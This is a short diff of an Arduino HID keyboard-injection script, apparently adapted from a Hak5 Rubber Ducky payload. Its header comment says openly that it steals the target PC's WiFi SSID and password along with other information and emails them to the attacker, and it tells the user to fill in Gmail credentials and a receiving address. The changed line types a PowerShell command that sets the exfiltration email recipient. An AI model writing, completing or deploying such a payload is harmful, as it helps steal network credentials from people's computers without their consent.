@@ -1,5 +1,7 @@
 /*
- This script steals the target PC's connected WiFi's SSID and password as well as some other info.
+ This script steals the target PC's connected WiFi's SSID and password as well as some other info and emailes it to you.
+ Make sure to change line 104 to your gmail address and password as well as line 116 to a recieving email address.
+ Original Script: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber
  */
 
 #include "Keyboard.h"
@@ -112,7 +114,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$ReportEmail.To.Add('kennysemailaddress@gmail.com')");
+  Keyboard.print("$ReportEmail.To.Add('recievingemailaddres@gmail.com')");
 
   typeKey(KEY_RETURN);
 
